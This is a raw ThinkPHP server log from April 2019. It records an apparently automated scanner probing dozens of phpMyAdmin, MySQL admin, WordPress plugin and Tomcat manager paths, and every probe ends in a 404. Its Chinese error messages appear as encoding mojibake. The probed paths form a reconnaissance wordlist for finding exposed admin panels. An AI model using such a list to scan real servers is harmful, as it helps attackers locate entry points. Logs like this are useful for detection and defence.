INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000224s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:46+08:00 ] 118.89.215.182 /MyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:46+08:00 ] 118.89.215.182 /phpMyAdmin1/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000226s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:47+08:00 ] 118.89.215.182 /phpMyAdmin123/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000265s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:47+08:00 ] 118.89.215.182 /pwd/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:47+08:00 ] 118.89.215.182 /phpMyAdmina/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpMydmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000326s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpMyAdmins/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000466s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpMyAdmin._/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpmyadmin2222/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /php2MyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000221s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpiMyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000274s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpNyAdmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000220s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /program/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000202s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /shopdb/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000204s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phppma/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000344s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /phpmy/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000087s ]
INFO: [ app_init ] --END-- [ RunTime:0.000446s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /mysql/admin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000247s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /mysql/dbadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /mysql/sqlmanager/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000602s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /mysql/mysqlmanager/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000219s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Manager

[ 2019-04-11T20:40:49+08:00 ] 118.89.215.182 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000332s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-11T23:01:56+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000238s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

